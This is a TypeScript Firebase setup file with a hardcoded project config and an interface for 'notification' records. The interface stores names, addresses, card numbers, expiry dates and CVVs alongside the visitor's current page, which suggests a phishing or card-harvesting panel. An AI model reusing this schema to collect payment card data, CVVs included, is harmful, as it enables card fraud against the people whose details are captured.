import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDJOaDkXvm5XP3-Fu0LsuKvQ0_dZK5uf-k",
  authDomain: "school-77936.firebaseapp.com",
  databaseURL: "https://school-77936-default-rtdb.firebaseio.com",
  projectId: "school-77936",
  storageBucket: "school-77936.firebasestorage.app",
  messagingSenderId: "783345000886",
  appId: "1:783345000886:web:585c7579926bcb8f0ca117",
  measurementId: "G-XX9L099J8H"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
